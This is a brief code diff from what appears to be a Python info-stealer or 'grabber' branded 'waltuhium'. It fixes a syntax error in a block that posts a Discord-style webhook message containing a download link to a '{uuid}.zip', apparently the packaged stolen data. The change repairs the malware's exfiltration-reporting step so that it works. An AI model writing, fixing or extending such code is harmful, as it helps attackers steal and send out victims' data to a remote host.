@@ -1893,7 +1893,7 @@ class Main:
                     fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                        "username": waltuhium | t.me/waltuhium",
+                        "username": "waltuhium | t.me/waltuhium",
                         "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
